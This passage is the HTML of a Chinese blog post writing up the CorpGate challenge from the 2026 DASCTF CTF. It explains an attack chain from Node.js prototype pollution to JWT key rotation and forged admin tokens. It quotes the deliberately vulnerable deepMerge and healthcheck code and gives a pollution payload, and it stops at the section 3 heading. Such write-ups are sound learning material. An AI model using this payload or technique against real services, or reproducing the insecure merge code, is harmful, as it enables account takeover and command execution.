@@ -1,0 +1,766 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://ether-lin.cn';window.REIMU_CONFIG.relative = '/';</script>
+  <title>
+    2026 DASCTF夏季赛 | 旧书页间，夹着半叶梧桐
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="CorpGate  题目概述 本题是一条精心设计的三段式攻击链：原型链污染触发 JWT 签名密钥轮换 → 伪造 Admin Token → 通过合法 Admin 接口获取一次性诊断引用 → 执行命令读取 Flag。题目综合考察了 Node.js 原型链污染、JWT 安全机制以及代码审计能力。  解题思路总览 12345678910111213141516171819普通用户注册&#x2F;登录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2026 DASCTF夏季赛">
+<meta property="og:url" content="http://ether-lin.cn/2026/05/30/2026-DASCTF%E5%A4%8F%E5%AD%A3%E8%B5%9B/index.html">
+<meta property="og:site_name" content="旧书页间，夹着半叶梧桐">
+<meta property="og:description" content="CorpGate  题目概述 本题是一条精心设计的三段式攻击链：原型链污染触发 JWT 签名密钥轮换 → 伪造 Admin Token → 通过合法 Admin 接口获取一次性诊断引用 → 执行命令读取 Flag。题目综合考察了 Node.js 原型链污染、JWT 安全机制以及代码审计能力。  解题思路总览 12345678910111213141516171819普通用户注册&#x2F;登录">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/62807544/1780122112328-38534f08-d84e-4bc7-a1c0-be7bdb6034e6.png">
+<meta property="article:published_time" content="2026-05-30T09:04:59.000Z">
+<meta property="article:modified_time" content="2026-05-30T09:08:50.646Z">
+<meta property="article:author" content="Ether">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/62807544/1780122112328-38534f08-d84e-4bc7-a1c0-be7bdb6034e6.png">
+      <meta name="keywords" content="网络安全学习,成长,思考">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">焦虑是自由的眩晕...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/archives">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/about">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/blog/friends">
+            <div class="main-nav-icon icon ">
+                  
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="搜索" aria-label="搜索"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/covers/06.jpg" alt="2026 DASCTF夏季赛">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">2026 DASCTF夏季赛</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content" class="sidebar-left"  >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#corpgate"><span class="toc-number">1.</span> <span class="toc-text"> CorpGate</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E6%80%BB%E8%A7%88"><span class="toc-number">1.2.</span> <span class="toc-text"> 解题思路总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text"> 关键源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%AE%BE%E7%BD%AE%E6%8E%A5%E5%8F%A3-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%85%A5%E5%8F%A3-routessettingsjs"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1. 设置接口 — 原型链污染入口 (routes&#x2F;settings.js)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%81%A5%E5%BA%B7%E6%A3%80%E6%9F%A5%E6%8E%A5%E5%8F%A3-%E5%AF%86%E9%92%A5%E8%BD%AE%E6%8D%A2%E8%A7%A6%E5%8F%91%E5%99%A8-routessystemjs"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 2. 健康检查接口 — 密钥轮换触发器 (routes&#x2F;system.js)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8A%A5%E5%91%8A%E6%89%A7%E8%A1%8C%E6%8E%A5%E5%8F%A3-flag-%E8%AF%BB%E5%8F%96%E7%AB%AF%E7%82%B9-routesdiagnosticjs"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3. 报告执行接口 — Flag 读取端点 (routes&#x2F;diagnostic.js)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-admin-%E9%9D%A2%E6%9D%BF-%E5%90%88%E6%B3%95%E5%88%9B%E5%BB%BA-diagnostic-entry-routesadminjs"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 4. Admin 面板 — 合法创建 Diagnostic Entry (routes&#x2F;admin.js)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-exp"><span class="toc-number">1.4.</span> <span class="toc-text"> 完整 Exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text"> 攻击链总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 踩坑记录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#taxmanager"><span class="toc-number">2.</span> <span class="toc-text"> TaxManager</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text"> 解题思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text"> 利用过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step-1-%E5%87%86%E5%A4%87%E5%A4%96%E9%83%A8%E6%81%B6%E6%84%8F-dtd"><span class="toc-number">2.2.1.</span> <span class="toc-text"> Step 1: 准备外部恶意 DTD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-%E4%BF%AE%E5%A4%8D-payload-%E5%B9%B6%E6%9B%B4%E6%96%B0-gist"><span class="toc-number">2.2.2.</span> <span class="toc-text"> Step 2: 修复 Payload 并更新 Gist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-3-%E6%9E%84%E9%80%A0%E7%BA%AF%E5%87%80-xml-%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.2.3.</span> <span class="toc-text"> Step 3: 构造纯净 XML 触发漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-4-%E8%8E%B7%E5%8F%96-flag"><span class="toc-number">2.2.4.</span> <span class="toc-text"> Step 4: 获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text"> 知识点总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#inkverse"><span class="toc-number">3.</span> <span class="toc-text"> InkVerse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF%E6%80%BB%E8%A7%88-2"><span class="toc-number">3.1.</span> <span class="toc-text"> 解题思路总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="toc-number">3.2.</span> <span class="toc-text"> 关键源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%89%93%E8%B5%8F%E6%8E%A5%E5%8F%A3-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%85%A5%E5%8F%A3-apitip"><span class="toc-number">3.2.1.</span> <span class="toc-text"> 1. 打赏接口 — 条件竞争入口 (&#x2F;api&#x2F;tip)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%96%87%E7%AB%A0%E5%AF%BC%E5%87%BA%E6%8E%A5%E5%8F%A3-token-%E6%B3%84%E9%9C%B2%E6%BA%90-apiexport"><span class="toc-number">3.2.2.</span> <span class="toc-text"> 2. 文章导出接口 — Token 泄露源 (&#x2F;api&#x2F;export)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%89%B9%E8%89%B2%E6%96%87%E7%AB%A0%E7%94%B3%E8%AF%B7-%E5%BC%82%E6%AD%A5%E5%A4%84%E7%90%86%E7%AB%AF%E7%82%B9-apireviewfeature"><span class="toc-number">3.2.3.</span> <span class="toc-text"> 3. 特色文章申请 — 异步处理端点 (&#x2F;api&#x2F;review&#x2F;feature)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%AC%E5%91%8A%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0-flag-%E6%9A%B4%E9%9C%B2%E8%A7%A6%E5%8F%91%E5%99%A8-apibulletinrefresh"><span class="toc-number">3.2.4.</span> <span class="toc-text"> 4. 公告缓存刷新 — Flag 暴露触发器 (&#x2F;api&#x2F;bulletin&#x2F;refresh)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4-exploit%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%93%8D%E4%BD%9C"><span class="toc-number">3.3.</span> <span class="toc-text"> 完整 Exploit（浏览器控制台操作）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step-1-%E6%B3%A8%E5%86%8C%E5%B9%B6%E7%99%BB%E5%BD%95%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7"><span class="toc-number">3.3.1.</span> <span class="toc-text"> Step 1: 注册并登录普通用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-2-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%8F%90%E5%8D%87%E5%A3%B0%E6%9C%9B"><span class="toc-number">3.3.2.</span> <span class="toc-text"> Step 2: 条件竞争提升声望</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-3-%E5%8F%91%E5%B8%83%E5%B9%B6%E6%89%B9%E5%87%86%E8%87%AA%E5%B7%B1%E7%9A%84%E6%96%87%E7%AB%A0"><span class="toc-number">3.3.3.</span> <span class="toc-text"> Step 3: 发布并批准自己的文章</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-4-%E5%AF%BC%E5%87%BA%E6%96%87%E7%AB%A0%E8%8E%B7%E5%8F%96-feature-token"><span class="toc-number">3.3.4.</span> <span class="toc-text"> Step 4: 导出文章获取 Feature-Token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-5-%E6%8F%90%E4%BA%A4%E7%89%B9%E8%89%B2%E6%96%87%E7%AB%A0%E7%94%B3%E8%AF%B7%E5%B9%B6%E8%BD%AE%E8%AF%A2%E7%8A%B6%E6%80%81"><span class="toc-number">3.3.5.</span> <span class="toc-text"> Step 5: 提交特色文章申请并轮询状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step-6-%E5%88%B7%E6%96%B0%E5%85%AC%E5%91%8A%E7%BC%93%E5%AD%98%E5%B9%B6%E8%8E%B7%E5%8F%96-flag"><span class="toc-number">3.3.6.</span> <span class="toc-text"> Step 6: 刷新公告缓存并获取 Flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E9%93%BE%E6%80%BB%E7%BB%93-2"><span class="toc-number">3.4.</span> <span class="toc-text"> 攻击链总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91%E8%AE%B0%E5%BD%95-2"><span class="toc-number">3.5.</span> <span class="toc-text"> 踩坑记录</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="Ether" class="lazyload">
+  <div class="sidebar-author-name">Ether</div>
+  <div class="sidebar-description">求索本身即是归路</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=2930289360@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/yourname itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/blog/friends" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon ">
+                
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-2026-DASCTF夏季赛" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-05-30T09:04:59.000Z" itemprop="datePublished">2026-05-30</time>
+    <time style="display: none;" id="post-update-time">2026-05-30</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="corpgate"><a class="markdownIt-Anchor" href="#corpgate"></a> CorpGate</h1>
+<h2 id="题目概述"><a class="markdownIt-Anchor" href="#题目概述"></a> 题目概述</h2>
+<p>本题是一条精心设计的三段式攻击链：<strong>原型链污染触发 JWT 签名密钥轮换 → 伪造 Admin Token → 通过合法 Admin 接口获取一次性诊断引用 → 执行命令读取 Flag</strong>。题目综合考察了 Node.js 原型链污染、JWT 安全机制以及代码审计能力。</p>
+<h2 id="解题思路总览"><a class="markdownIt-Anchor" href="#解题思路总览"></a> 解题思路总览</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">普通用户注册/登录</span><br><span class="line">       ↓</span><br><span class="line">POST /api/settings (原型链污染)</span><br><span class="line">       ↓</span><br><span class="line">Object.prototype.pending = EVIL_KEY</span><br><span class="line">       ↓</span><br><span class="line">GET /api/system/healthcheck (触发密钥轮换)</span><br><span class="line">       ↓</span><br><span class="line">config.jwtSecret 被替换为 EVIL_KEY</span><br><span class="line">       ↓</span><br><span class="line">使用 EVIL_KEY 伪造 role:admin 的 JWT</span><br><span class="line">       ↓</span><br><span class="line">GET /admin (合法创建 diagnostic entry)</span><br><span class="line">       ↓</span><br><span class="line">从 HTML 中提取 reference (32位hex)</span><br><span class="line">       ↓</span><br><span class="line">POST /api/reports/execute &#123;reference&#125;</span><br><span class="line">       ↓</span><br><span class="line">execSync(&#x27;/readflag&#x27;) → 🚩 FLAG</span><br></pre></td></tr></table></figure>
+<hr />
+<h2 id="关键源码分析"><a class="markdownIt-Anchor" href="#关键源码分析"></a> 关键源码分析</h2>
+<h3 id="1-设置接口-原型链污染入口-routessettingsjs"><a class="markdownIt-Anchor" href="#1-设置接口-原型链污染入口-routessettingsjs"></a> 1. 设置接口 — 原型链污染入口 (<code>routes/settings.js</code>)</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// routes/settings.js（关键片段）</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/api/settings&#x27;</span>, authMiddleware, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// sanitizeKey 仅移除 &#x27;.&#x27;，但不阻止 &#x27;__proto__&#x27; 或 &#x27;constructor&#x27;</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">sanitizeKey</span>(<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> key.<span class="title function_">replace</span>(<span class="regexp">/\./g</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">deepMerge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">      <span class="keyword">var</span> cleanKey = <span class="title function_">sanitizeKey</span>(key);</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; source[key] !== <span class="literal">null</span> &amp;&amp; !<span class="title class_">Array</span>.<span class="title function_">isArray</span>(source[key])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!target[cleanKey]) target[cleanKey] = &#123;&#125;;</span><br><span class="line">        <span class="title function_">deepMerge</span>(target[cleanKey], source[key]);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        target[cleanKey] = source[key]; <span class="comment">// ⚠️ 当 cleanKey=&#x27;prototype&#x27; 时污染原型链</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">deepMerge</span>(config.<span class="property">userSettings</span>[req.<span class="property">user</span>.<span class="property">username</span>], req.<span class="property">body</span>);</span><br><span class="line">  res.<span class="title function_">json</span>(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">message</span>: <span class="string">&#x27;Settings updated&#x27;</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：<code>sanitizeKey</code> 只过滤了 <code>.</code>，没有过滤 <code>constructor</code> 和 <code>prototype</code>。当传入 <code>&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;pending&quot;:&quot;EVIL_KEY&quot;&#125;&#125;&#125;</code> 时，<code>deepMerge</code> 会将 <code>EVIL_KEY</code> 写入 <code>Object.prototype.pending</code>，从而污染所有对象的原型链。</p>
+<h3 id="2-健康检查接口-密钥轮换触发器-routessystemjs"><a class="markdownIt-Anchor" href="#2-健康检查接口-密钥轮换触发器-routessystemjs"></a> 2. 健康检查接口 — 密钥轮换触发器 (<code>routes/system.js</code>)</h3>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// routes/system.js（关键片段）</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/api/system/healthcheck&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> rotated = <span class="literal">false</span>;</span><br><span class="line">  <span class="comment">// ⚠️ 由于原型链污染，&#123;&#125; 继承了 Object.prototype.pending = EVIL_KEY</span></span><br><span class="line">  <span class="keyword">var</span> pendingKey = config.<span class="property">signingState</span>.<span class="property">pending</span> || &#123;&#125;.<span class="property">pending</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (pendingKey &amp;&amp; <span class="keyword">typeof</span> pendingKey === <span class="string">&#x27;string&#x27;</span> &amp;&amp; pendingKey.<span class="property">length</span> &gt;= <span class="number">16</span>) &#123;</span><br><span class="line">    config.<span class="property">jwtSecret</span> = pendingKey;          <span class="comment">// 签名密钥被替换！</span></span><br><span class="line">    config.<span class="property">signingState</span>.<span class="property">version</span> += <span class="number">1</span>;</span><br><span class="line">    config.<span class="property">signingState</span>.<span class="property">rotatedAt</span> = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">    <span class="keyword">delete</span> config.<span class="property">signingState</span>.<span class="property">pending</span>;     <span class="comment">// 删除自身属性，但原型链上仍有</span></span><br><span class="line">    rotated = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">json</span>(&#123;</span><br><span class="line">    <span class="attr">status</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">    <span class="attr">uptime</span>: process.<span class="title function_">uptime</span>(),</span><br><span class="line">    <span class="attr">signingVersion</span>: config.<span class="property">signingState</span>.<span class="property">version</span>,</span><br><span class="line">    <span class="attr">rotated</span>: rotated                        <span class="comment">// 返回 true 确认轮换成功</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>利用点</strong>：<code>&#123;&#125;.pending</code> 在正常情况下为 <code>undefined</code>，但由于我们在上一步中污染了 <code>Object.prototype.pending</code>，此处取到了我们注入的恶意密钥 <code>EVIL_KEY</code>，并将其赋值给 <code>config.jwtSecret</code>。<strong>这是整条攻击链的核心枢纽</strong>。</p>
+<h3 id="3-报告执行接口-flag-读取端点-routesdiagnosticjs"><a class="markdownIt-Anchor" href="#3-报告执行接口-flag-读取端点-routesdiagnosticjs"></a> 3. 报告执行接口 — Flag 读取端点 (<code>routes/diagnostic.js</code>)</h3>
